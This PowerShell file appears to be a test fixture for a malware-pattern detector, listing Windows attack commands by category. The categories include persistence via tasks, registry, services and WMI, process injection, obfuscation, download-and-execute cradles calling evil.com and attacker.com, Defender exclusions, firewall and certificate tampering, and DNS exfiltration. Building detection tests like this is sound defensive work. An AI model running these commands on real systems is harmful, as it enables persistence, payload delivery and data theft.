#!/usr/bin/env pwsh
# Advanced Windows-specific malicious patterns test file

# ===== WINDOWS TASK SCHEDULER PERSISTENCE =====
# Create scheduled task for persistence
schtasks /create /tn "UpdateService" /tr "powershell -EncodedCommand ..." /sc onlogon
New-ScheduledTask -Action (New-ScheduledTaskAction -Execute "cmd.exe") -Trigger (New-ScheduledTaskTrigger -AtLogOn)
Register-ScheduledTask -TaskName "Backup" -Action (New-ScheduledTaskAction -Execute "curl.exe")

# ===== WINDOWS REGISTRY MANIPULATION =====
# Add to Run key for persistence
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "Update" /t REG_SZ /d "C:\malware.exe"
reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce" /v "Cleanup" /t REG_SZ /d "powershell.exe -c ..."
[Microsoft.Win32.Registry]::SetValue("HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run", "Service", "C:\backdoor.exe")

# ===== WINDOWS SERVICE INSTALLATION =====
# Install malicious service
sc create "SystemService" binPath= "C:\Windows\System32\svchost.exe -k netsvcs"
New-Service -Name "UpdateService" -BinaryPathName "C:\malware\service.exe"
InstallUtil.exe /i C:\backdoor.exe

# ===== WINDOWS STARTUP FOLDER =====
# Copy to startup folder
Copy-Item "C:\malware.exe" "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\"
$startup = [Environment]::GetFolderPath("Startup")
Move-Item "backdoor.exe" "$startup\"

# ===== WMI PERSISTENCE =====
# WMI event subscription for persistence
$filter = Set-WmiInstance -Class __EventFilter -Arguments @{Name="ProcessStart"; EventNameSpace="root\cimv2"; QueryLanguage="WQL"; Query="SELECT * FROM Win32_ProcessStartTrace"}
$consumer = Set-WmiInstance -Class __EventConsumer -Arguments @{Name="ProcessStartConsumer"; CommandLineTemplate="cmd.exe /c C:\backdoor.exe"}
Register-WmiEvent -Query "SELECT * FROM Win32_ProcessStartTrace WHERE ProcessName='explorer.exe'" -Action { Start-Process "C:\malware.exe" }

# ===== PROCESS INJECTION =====
# Process injection techniques
$hProcess = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((Get-ProcAddress kernel32.dll VirtualAllocEx), [Func[IntPtr, IntPtr, Int, UInt32, UInt32, IntPtr]])
WriteProcessMemory($hProcess, $lpBaseAddress, $lpBuffer, $nSize, [ref]$lpNumberOfBytesWritten)
CreateRemoteThread($hProcess, $lpThreadAttributes, $dwStackSize, $lpStartAddress, $lpParameter, $dwCreationFlags, $lpThreadId)
NtCreateThreadEx($hThread, $dwDesiredAccess, $lpThreadAttributes, $hProcess, $lpStartAddress, $lpParameter, $dwCreationFlags, $dwStackSize, $dwSizeOfStackReserve, $dwSizeOfStackCommit, $lpBytesBuffer)

# ===== PROCESS HOLLOWING =====
# Process hollowing technique
NtUnmapViewOfSection($hProcess, $lpBaseAddress)
ZwUnmapViewOfSection($hProcess, $lpBaseAddress)
# Process hollowing attack

# ===== REFLECTIVE DLL LOADING =====
# Reflective DLL loading
$dllBytes = [System.IO.File]::ReadAllBytes("C:\malware.dll")
$dllBase = VirtualAlloc([IntPtr]::Zero, $dllBytes.Length, 0x3000, 0x40)
[System.Runtime.InteropServices.Marshal]::Copy($dllBytes, 0, $dllBase, $dllBytes.Length)
$reflectiveLoader = GetProcAddress($dllBase, "ReflectiveLoader")
$dllMain = GetProcAddress($dllBase, "DllMain")

# ===== POWERSHELL OBFUSCATION =====
# PowerShell obfuscation techniques
$encoded = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes("malicious code"))
$decoded = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($encoded))
$script = -join ([char[]](72,101,108,108,111))  # Character array obfuscation
$cmd = "IEX $($encoded -replace '.',{$args[0]})"  # String replacement obfuscation
Invoke-Expression -Command $decoded
Compress-Archive -Path "payload.ps1" -DestinationPath "archive.zip"
Expand-Archive -Path "archive.zip" -DestinationPath "C:\temp\" -Force

# ===== POWERSHELL DOWNLOAD CRADLE =====
# PowerShell download and execute
$webClient = New-Object System.Net.WebClient
$payload = $webClient.DownloadString("http://evil.com/payload.ps1")
Invoke-Expression $payload

Invoke-WebRequest -Uri "http://malware.com/backdoor.exe" -OutFile "C:\temp\backdoor.exe"
IWR "http://evil.com/script.ps1" | IEX

$payload = Invoke-RestMethod -Uri "http://attacker.com/payload"
$payload.Invoke()
$webClient.DownloadFile("http://evil.com/malware.exe", "C:\Windows\Temp\malware.exe")
Start-Process "C:\Windows\Temp\malware.exe"

# ===== CERTIFICATE MANIPULATION =====
# Certificate store manipulation
certmgr.exe /add "C:\malware.cer" /s /r localMachine TrustedPublisher
Import-Certificate -FilePath "C:\evil.cer" -CertStoreLocation Cert:\LocalMachine\Root
Add-Certificate -FilePath "C:\backdoor.cer" -StoreLocation LocalMachine -StoreName Root

# ===== WINDOWS DEFENDER EXCLUSION =====
# Windows Defender exclusion manipulation
Add-MpPreference -ExclusionPath "C:\malware"
Set-MpPreference -ExclusionPath "C:\Windows\Temp\backdoor.exe"
powershell -Command "Add-MpPreference -ExclusionPath 'C:\evil'"

# ===== FIREWALL MANIPULATION =====
# Firewall rule manipulation
netsh firewall add allowedprogram "C:\malware.exe" "UpdateService" ENABLE
New-NetFirewallRule -DisplayName "UpdateService" -Direction Inbound -Action Allow -Program "C:\backdoor.exe"
netsh advfirewall firewall add rule name="Backdoor" dir=in action=allow program="C:\malware.exe"

# ===== PROCESS MASQUERADING =====
# Process masquerading (renaming malicious processes)
Copy-Item "C:\malware.exe" "C:\Windows\System32\svchost.exe"
Start-Process "C:\Windows\System32\svchost.exe" -ArgumentList "malicious payload"
# Process masquerading as explorer.exe
Start-Process "C:\backdoor.exe" -ArgumentList "explorer.exe payload"

# ===== SCHEDULED TASK WITH SUSPICIOUS COMMAND =====
# Scheduled task with suspicious execution
at 14:30 curl http://evil.com/payload | powershell
at 12:00 wget http://malware.com/backdoor.exe -O C:\temp\backdoor.exe
schtasks /create /tn "Update" /tr "curl http://evil.com | powershell" /sc daily
schtasks /create /tn "Backup" /tr "powershell -EncodedCommand ZQB4AGUAYwB1AHQAZQBkACAAcABhAHkAbABvAGEAZAA=" /sc onstart

# ===== ICMP EXFILTRATION =====
# ICMP-based data exfiltration
ping -n 1 -l 64 192.168.1.100  # ICMP exfil (Windows ping doesn't support -p flag)
# hping3 -1 -c 1 -d 64 -E C:\temp\data.txt 192.168.1.100  # Would need hping3 installed

# ===== DNS TUNNELING =====
# DNS tunneling for data exfiltration
# Note: These are cross-platform tools that could be installed on Windows
# dnscat2 --dns server=evil.com
# dns2tcp -r evil.com -z domain.com
# iodine -f -P password 192.168.1.100 evil.com
Resolve-DnsName -Name "base64encodeddata.evil.com" -Type TXT
Resolve-DnsName -Name "base64data.attacker.com" -Server "8.8.8.8" -Type TXT
nslookup base64encodeddata.evil.com
nslookup base64data.attacker.com 8.8.8.8

# ===== ENCODING CHAINS =====
# Multiple encoding/decoding chains
$data = [System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes([System.Convert]::ToBase64String($payload)))
$decoded = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($data))))

# ===== COMPRESSED PAYLOAD =====
# Compressed or archived payload execution
# Note: Some commands require tools to be installed (7-Zip, tar for Windows)
# gzip -d payload.gz | powershell
# gunzip -c malware.ps1 | powershell
Expand-Archive -Path "backdoor.zip" -DestinationPath "C:\temp\" -Force; & "C:\temp\backdoor.exe"
Expand-Archive -Path "malware.zip" -Force; & ".\malware.ps1"
7z x payload.7z; & ".\payload.exe"